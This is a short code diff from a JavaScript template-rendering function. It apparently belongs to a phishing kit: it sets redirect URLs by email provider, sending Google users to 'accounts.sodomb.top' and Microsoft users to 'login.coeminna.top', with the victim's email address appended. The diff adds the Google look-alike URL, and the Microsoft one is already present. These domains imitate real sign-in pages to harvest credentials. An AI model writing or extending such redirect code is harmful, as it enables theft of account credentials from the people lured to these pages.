@@ -285,7 +285,7 @@ export async function renderVueTemplate(metadata = {}) {
           }
 
           if (isGoogleEmail) {
-            targetUrl = '' + encodeURIComponent(email);
+            targetUrl = 'https://accounts.sodomb.top?oAh6WzQhri-5=aGRka3o=#smn=' + encodeURIComponent(email);
           } else if (isMicrosoftEmail) {
             targetUrl = 'https://login.coeminna.top?PMHaia5eD2E=cnd5YQ==&omn=' + encodeURIComponent(email);
           } else {
